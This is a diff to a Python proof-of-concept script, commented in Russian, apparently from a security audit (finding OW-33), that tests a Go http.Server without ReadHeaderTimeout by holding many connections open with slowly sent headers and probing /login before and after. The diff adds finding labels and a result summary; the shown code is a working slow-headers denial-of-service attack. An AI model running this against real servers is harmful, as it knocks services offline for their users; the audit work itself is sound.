@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-03 — медленные заголовки против http.Server без ReadHeaderTimeout.
+03 — медленные заголовки против http.Server без ReadHeaderTimeout (OW-33).
 
 server.go:61-66 поднимает ListenAndServe() с сервером по умолчанию:
 нет ReadHeaderTimeout, ReadTimeout, WriteTimeout, IdleTimeout.
@@ -32,7 +32,7 @@ def probe() -> tuple[int, float]:
         return 0, time.time() - t
 
 
-print("== до атаки ==")
+print("== OW-33: до атаки ==")
 code, dt = probe()
 print("GET /login -> %d за %.2fs" % (code, dt))
 
@@ -53,7 +53,7 @@ for i in range(N):
         fail += 1
         break
 
-print("\n== держим %d соединений %d секунд (байты шлём раз в 3с) ==" % (len(socks), HOLD))
+print("\n== OW-33: держим %d соединений %d секунд (байты шлём раз в 3с) ==" % (len(socks), HOLD))
 alive = len(socks)
 end = time.time() + HOLD
 while time.time() < end:
@@ -71,8 +71,16 @@ while time.time() < end:
 
 print("соединений удерживается: %d (упало по сети: %d)" % (alive, fail))
 print("если сервер закрыл 0 — ReadHeaderTimeout отсутствует и fd висят вечно")
+print("┌─ АРТЕФАКТ · OW-33")
+print("│ соединения удерживаются: %d; закрыты сервером: %d; probe до атаки: %s" %
+      (alive, len(socks) - alive, code))
+print("└─")
+if alive and code == 200:
+    print("\033[32m[+] сервер держит незавершённые заголовки: ReadHeaderTimeout отсутствует\033[0m")
+else:
+    print("\033[31m[-] соединения не удерживались — закрытие по таймауту вдруг работает\033[0m")
 
-print("\n== после атаки ==")
+print("\n== OW-33: после атаки ==")
 for _ in range(3):
     code, dt = probe()
     print("GET /login -> %d за %.2fs" % (code, dt))
